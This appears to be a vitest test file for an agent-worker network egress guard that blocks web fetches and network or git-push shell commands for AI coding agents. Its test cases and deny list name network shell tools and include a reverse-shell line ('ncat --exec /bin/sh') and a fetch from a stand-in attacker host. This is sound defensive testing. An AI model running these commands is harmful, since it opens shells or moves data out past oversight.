/**
 * Tests for the agent-worker network egress guard
 * (agent-worker/src/networkGuard.ts).
 *
 * Verifies that the Copilot permission handler denies web/URL fetches and
 * network/push shell commands while approving normal work, and that the Claude
 * disallow list covers the web tools and network/push shell commands.
 */

import { describe, it, expect } from "vitest";
import {
  NETWORK_DISALLOWED_TOOLS,
  isBlockedNetworkCommand,
  restrictNetworkPermissionHandler,
} from "../../agent-worker/src/networkGuard.js";

/** Build a minimal shell permission request carrying a command string. */
function shellRequest(fullCommandText: string): Parameters<typeof restrictNetworkPermissionHandler>[0] {
  return { kind: "shell", fullCommandText } as unknown as Parameters<
    typeof restrictNetworkPermissionHandler
  >[0];
}

const invocation = { sessionId: "test-session" };

describe("networkGuard.isBlockedNetworkCommand", () => {
  it.each([
    "curl https://example.com",
    "wget http://evil.test/x",
    "nc 10.0.0.1 4444",
    "ncat --exec /bin/sh 10.0.0.1 4444",
    "netcat 10.0.0.1 4444",
    "telnet example.com 80",
    "ssh user@host",
    "scp file user@host:/tmp",
    "sftp user@host",
    "ftp example.com",
    "aria2c https://example.com/big",
    "lynx https://example.com",
    "links http://example.com",
    "git push origin HEAD",
    "git push --force origin main",
    "git fetch origin",
    "git pull",
    "git clone https://example.com/repo.git",
    "git ls-remote https://example.com/repo.git",
    "git remote-update",
  ])("blocks %s", (cmd) => {
    expect(isBlockedNetworkCommand(cmd)).toBe(true);
  });

  it.each([
    "git commit -m 'work'",
    "git add -A",
    "git status",
    "npm test",
    "ls -la",
    "cat README.md",
    "node build.js",
    "echo curling is fun", // substring, not the curl binary
  ])("allows %s", (cmd) => {
    expect(isBlockedNetworkCommand(cmd)).toBe(false);
  });
});

describe("networkGuard.restrictNetworkPermissionHandler", () => {
  it("rejects url (web fetch) requests", () => {
    const result = restrictNetworkPermissionHandler(
      { kind: "url" } as unknown as Parameters<typeof restrictNetworkPermissionHandler>[0],
      invocation,
    );
    expect(result).toEqual(
      expect.objectContaining({ kind: "reject" }),
    );
  });

  it("rejects shell commands that reach the network", () => {
    const result = restrictNetworkPermissionHandler(
      shellRequest("curl https://example.com"),
      invocation,
    );
    expect(result).toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("rejects git push", () => {
    const result = restrictNetworkPermissionHandler(
      shellRequest("git push origin HEAD:refs/for/main"),
      invocation,
    );
    expect(result).toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("approves normal shell commands", () => {
    const result = restrictNetworkPermissionHandler(
      shellRequest("git commit -m 'fix'"),
      invocation,
    );
    expect(result).not.toEqual(expect.objectContaining({ kind: "reject" }));
  });

  it("approves file writes", () => {
    const result = restrictNetworkPermissionHandler(
      { kind: "write", fileName: "src/x.ts" } as unknown as Parameters<
        typeof restrictNetworkPermissionHandler
      >[0],
      invocation,
    );
    expect(result).not.toEqual(expect.objectContaining({ kind: "reject" }));
  });
});

describe("networkGuard.NETWORK_DISALLOWED_TOOLS (Claude)", () => {
  it("removes the web tools from the model context", () => {
    expect(NETWORK_DISALLOWED_TOOLS).toContain("WebFetch");
    expect(NETWORK_DISALLOWED_TOOLS).toContain("WebSearch");
  });

  it("blocks network and push shell commands via scoped Bash rules", () => {
    for (const rule of [
      "Bash(curl:*)",
      "Bash(wget:*)",
      "Bash(nc:*)",
      "Bash(ncat:*)",
      "Bash(netcat:*)",
      "Bash(telnet:*)",
      "Bash(ssh:*)",
      "Bash(scp:*)",
      "Bash(sftp:*)",
      "Bash(ftp:*)",
      "Bash(lynx:*)",
      "Bash(links:*)",
      "Bash(aria2c:*)",
      "Bash(git push:*)",
      "Bash(git fetch:*)",
      "Bash(git pull:*)",
      "Bash(git clone:*)",
      "Bash(git ls-remote:*)",
      "Bash(git remote-update:*)",
    ]) {
      expect(NETWORK_DISALLOWED_TOOLS).toContain(rule);
    }
  });
});
